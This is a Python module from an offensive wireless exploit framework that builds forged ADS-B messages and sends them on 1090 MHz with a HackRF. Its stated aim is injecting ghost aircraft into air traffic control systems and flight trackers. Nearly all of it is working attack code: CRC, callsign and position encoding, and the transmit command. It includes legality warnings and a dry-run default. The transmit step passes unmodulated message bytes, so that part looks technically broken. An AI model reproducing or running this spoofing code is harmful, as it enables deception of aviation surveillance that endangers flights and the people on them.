#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""ADS-B (Automatic Dependent Surveillance-Broadcast) spoofing module.

Generates and transmits spoofed ADS-B messages on 1090 MHz to inject
ghost aircraft into ATC (Air Traffic Control) systems and flight trackers.
ADS-B has no authentication or encryption by design, making it trivially
spoofable with an SDR transmitter.

WARNING: Transmitting on 1090 MHz is illegal in most jurisdictions and
can interfere with aviation safety. This module is for authorized
research in RF-shielded environments only.

References:
  https://mode-s.org/decode/
  https://www.rtl-sdr.com/adsb-aircraft-radar-with-rtl-sdr/
  Costin & Francillon, "Ghost in the Air(Traffic)", BlackHat 2012
  Schaefer et al., "OpenSky Report 2019"

MITRE ATT&CK: T1498 (Network Denial of Service), T1565 (Data Manipulation)
CWE: CWE-345 (Insufficient Verification of Data Authenticity)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import math
import shutil
import struct
import subprocess
from dataclasses import dataclass
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

ADSB_FREQ_MHZ = 1090
ADSB_PREAMBLE = bytes([0xAA, 0x55, 0xAA, 0x55])


@dataclass
class ADSBPosition:
    icao: str
    callsign: str
    latitude: float
    longitude: float
    altitude_ft: int
    speed_kts: int = 0
    heading_deg: int = 0
    vertical_rate: int = 0
    squawk: str = "1200"


def _crc24(data: bytes) -> int:
    """Compute CRC-24 for ADS-B (generator polynomial 0xFFF409)."""
    generator = 0xFFF409
    crc = 0
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= generator
    return crc & 0xFFFFFF


def _encode_callsign(callsign: str) -> bytes:
    """Encode callsign into ADS-B identification message (DF17, TC=1-4)."""
    charset = "#ABCDEFGHIJKLMNOPQRSTUVWXYZ##### ###############0123456789######"
    padded = callsign.upper().ljust(8)[:8]
    bits = 0
    for ch in padded:
        idx = charset.find(ch)
        if idx < 0:
            idx = 32
        bits = (bits << 6) | idx
    return struct.pack(">Q", bits)[:6]


def _encode_cpr_lat(lat: float, odd: bool) -> int:
    """Encode latitude into CPR format."""
    nz = 15
    dlat = 360.0 / (4 * nz - (1 if odd else 0))
    yz = math.floor((1 << 17) * (lat % dlat) / dlat + 0.5)
    return yz & 0x1FFFF


def _encode_cpr_lon(lon: float, lat: float, odd: bool) -> int:
    """Encode longitude into CPR format."""
    nz = 15
    dlat = 360.0 / (4 * nz - (1 if odd else 0))
    nl_val = max(1, math.floor(2 * math.pi / (math.acos(1 - (1 - math.cos(math.pi / (2 * nz))) / (math.cos(math.pi * lat / 180) ** 2 + 1e-15)))) if abs(lat) < 87.0 else 1)
    dlon = 360.0 / max(nl_val - (1 if odd else 0), 1)
    xz = math.floor((1 << 17) * (lon % dlon) / dlon + 0.5)
    return xz & 0x1FFFF


def _build_adsb_airborne_position(pos: ADSBPosition, odd: bool = False) -> bytes:
    """Build DF17 airborne position message."""
    icao_bytes = bytes.fromhex(pos.icao.replace(" ", ""))

    df = 17
    ca = 5
    tc = 11
    ss = 0
    alt_code = (pos.altitude_ft + 1000) // 25 & 0xFFF

    byte0 = (df << 3) | ca
    me = bytearray(7)
    me[0] = (tc << 3) | (ss << 1) | (0)
    me[1] = (alt_code >> 4) & 0xFF
    me[2] = ((alt_code & 0x0F) << 4) | (0)

    lat_cpr = _encode_cpr_lat(pos.latitude, odd)
    lon_cpr = _encode_cpr_lon(pos.longitude, pos.latitude, odd)

    me[2] |= (1 if odd else 0) << 2
    me[2] |= (lat_cpr >> 15) & 0x03
    me[3] = (lat_cpr >> 7) & 0xFF
    me[4] = ((lat_cpr & 0x7F) << 1) | ((lon_cpr >> 16) & 0x01)
    me[5] = (lon_cpr >> 8) & 0xFF
    me[6] = lon_cpr & 0xFF

    msg = bytes([byte0]) + icao_bytes + bytes(me)
    crc = _crc24(msg)
    return msg + struct.pack(">I", crc)[1:]


def _build_adsb_identification(pos: ADSBPosition) -> bytes:
    """Build DF17 aircraft identification message."""
    icao_bytes = bytes.fromhex(pos.icao.replace(" ", ""))
    df = 17
    ca = 5
    byte0 = (df << 3) | ca

    tc = 4
    ec = 0
    cs_encoded = _encode_callsign(pos.callsign)
    me = bytes([((tc << 3) | ec)]) + cs_encoded + b"\x00"

    msg = bytes([byte0]) + icao_bytes + me[:7]
    crc = _crc24(msg)
    return msg + struct.pack(">I", crc)[1:]


class ADSBSpoofer(Exploit):
    """ADS-B 1090 MHz spoofing module."""

    __info__: dict[str, Any] = {
        "name": "ADS-B Spoofer",
        "description": (
            "Generate and inject spoofed ADS-B messages on 1090 MHz to create "
            "ghost aircraft. Supports position, identification, and velocity "
            "messages. Requires SDR transmitter (HackRF, USRP, bladeRF)."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://mode-s.org/decode/",
            "https://github.com/antirez/dump1090",
        ),
        "devices": ("ADS-B receivers", "ATC systems", "Flight trackers"),
        "severity": "critical",
        "cvss": "9.1",
        "cve": "generic",
        "mitre": ["T1498", "T1565"],
    }

    icao_hex = OptString("A1B2C3", "ICAO 24-bit address (hex)")
    callsign = OptString("GHOST01", "Aircraft callsign (max 8 chars)")
    latitude = OptString("40.7128", "Latitude (decimal degrees)")
    longitude = OptString("-74.0060", "Longitude (decimal degrees)")
    altitude = OptInteger(35000, "Altitude in feet")
    speed = OptInteger(450, "Ground speed in knots")
    heading = OptInteger(90, "Heading in degrees")
    sdr_device = OptString("hackrf", "SDR: hackrf, usrp, bladerf")
    tx_gain = OptInteger(20, "TX gain in dB")
    message_count = OptInteger(100, "Number of messages to generate")
    output_file = OptString("adsb_spoof.bin", "Output file for generated messages")
    dry_run = OptBool(True, "Generate messages without transmitting (default: safe)")

    def check(self) -> str:
        """Verify SDR tools are available."""
        sdr = str(self.sdr_device.value).lower()
        tool_map = {
            "hackrf": "hackrf_transfer",
            "usrp": "uhd_siggen",
            "bladerf": "bladeRF-cli",
        }
        tool = tool_map.get(sdr, "hackrf_transfer")
        if shutil.which(tool):
            return f"SDR tool found: {tool}"
        return f"SDR tool not found: {tool}. Install the appropriate SDK."

    def _generate_messages(self, pos: ADSBPosition) -> list[bytes]:
        """Generate a sequence of ADS-B messages."""
        messages: list[bytes] = []

        messages.append(_build_adsb_identification(pos))

        count = int(self.message_count.value)
        for i in range(count):
            odd = i % 2 == 1
            messages.append(_build_adsb_airborne_position(pos, odd=odd))

        return messages

    def _save_messages(self, messages: list[bytes]) -> str:
        """Save raw ADS-B messages to file."""
        outpath = str(self.output_file.value)
        with open(outpath, "wb") as fh:
            for msg in messages:
                fh.write(msg)
                fh.write(b"\x00")
        return outpath

    def _transmit_hackrf(self, filepath: str) -> None:
        """Transmit via HackRF One."""
        cmd = [
            "hackrf_transfer",
            "-t", filepath,
            "-f", str(ADSB_FREQ_MHZ * 1_000_000),
            "-s", "2000000",
            "-x", str(self.tx_gain.value),
        ]
        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return

        print_warning("[!] TRANSMITTING on 1090 MHz: ensure authorized RF-shielded environment")
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            print_success("[+] Transmission complete")
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] TX failed: {exc}")

    def run(self) -> None:
        """Execute ADS-B spoofing."""
        print_status("[*] ADS-B Spoofer v1.0.0")
        print_warning("[!] ADS-B transmission on 1090 MHz is restricted.")
        print_warning("[!] Use only in authorized, RF-shielded environments.")

        pos = ADSBPosition(
            icao=str(self.icao_hex.value),
            callsign=str(self.callsign.value),
            latitude=float(str(self.latitude.value)),
            longitude=float(str(self.longitude.value)),
            altitude_ft=int(self.altitude.value),
            speed_kts=int(self.speed.value),
            heading_deg=int(self.heading.value),
        )

        print_info(f"[*] ICAO: {pos.icao}, Callsign: {pos.callsign}")
        print_info(f"[*] Position: {pos.latitude}, {pos.longitude} @ {pos.altitude_ft}ft")

        messages = self._generate_messages(pos)
        print_success(f"[+] Generated {len(messages)} ADS-B messages")

        outpath = self._save_messages(messages)
        print_info(f"[*] Messages saved to {outpath}")

        for i, msg in enumerate(messages[:3]):
            crc_check = _crc24(msg[:-3])
            actual_crc = int.from_bytes(msg[-3:], "big")
            status = "OK" if crc_check == actual_crc else "MISMATCH"
            print_info(f"    [{i}] {msg.hex()} CRC={status}")

        if not self.dry_run.value:
            sdr = str(self.sdr_device.value).lower()
            if sdr == "hackrf":
                self._transmit_hackrf(outpath)
            else:
                print_info(f"[*] Use {sdr} tools to transmit {outpath} on {ADSB_FREQ_MHZ} MHz")
        else:
            print_info("[*] dry_run=true: messages generated but not transmitted")
